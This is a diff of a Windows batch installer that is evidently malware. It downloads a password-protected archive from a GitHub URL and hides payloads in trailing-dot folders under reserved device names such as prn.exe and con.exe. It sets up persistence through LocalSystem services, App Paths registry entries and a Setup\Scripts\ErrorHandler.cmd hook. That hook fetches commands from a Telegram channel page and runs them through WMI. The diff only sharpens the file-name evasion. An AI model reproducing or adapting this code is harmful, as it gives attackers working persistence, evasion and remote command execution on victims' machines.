@@ -3,7 +3,7 @@ schtasks /Delete /TN "\Windows\Help" /F
 
 mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vltex/1/raw/1/r/UnRAR.exe
-dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/1/raw/1/r/wireguard.rar
+dir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" >nul || curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/1/raw/1/r/wireguard.rar
 
 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" x -y -o+ -p963258741 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 
@@ -12,10 +12,10 @@ mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
 mkdir %WINDIR%\Setup\Scripts
 
-copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
+copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\prn.exe"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\diaglogs..\con.exe"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
 
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
@@ -29,18 +29,18 @@ fsutil file setshortname C:\ProgramData\logdata..\ ""
 fsutil file setshortname C:\ProgramData\diaglogs..\ ""
 
 echo powershell.exe -NoProfile -Command "$u='https://t.me/s/apinono';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
-echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
-echo powershell.exe \\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini >> "%ProgramData%\USOShared\logs.cmd"
+echo powershell.exe \\.\%ProgramData%\logdata..\prn.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
+echo powershell.exe \\.\%ProgramData%\diaglogs..\con.exe \\.\%ProgramData%\diaglogs..\con.ini >> "%ProgramData%\USOShared\logs.cmd"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\info.exe" /t REG_SZ /d "%ProgramData%\USOShared\logs.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%ProgramData%\USOShared\log.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
-sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+sc create Update binPath="\\.\%ProgramData%\logdata..\prn.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
 
 sc create Configuration binPath="%WINDIR%\System32\cmd.exe /c start info.exe" start="auto" obj="LocalSystem"
-sc create Network binPath="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
+sc create Network binPath="\\.\%ProgramData%\diaglogs..\con.exe \\.\%ProgramData%\diaglogs..\con.ini" start="auto" obj="LocalSystem"
 sc config Configuration start= delayed-auto
 sc config Network start= delayed-auto
 
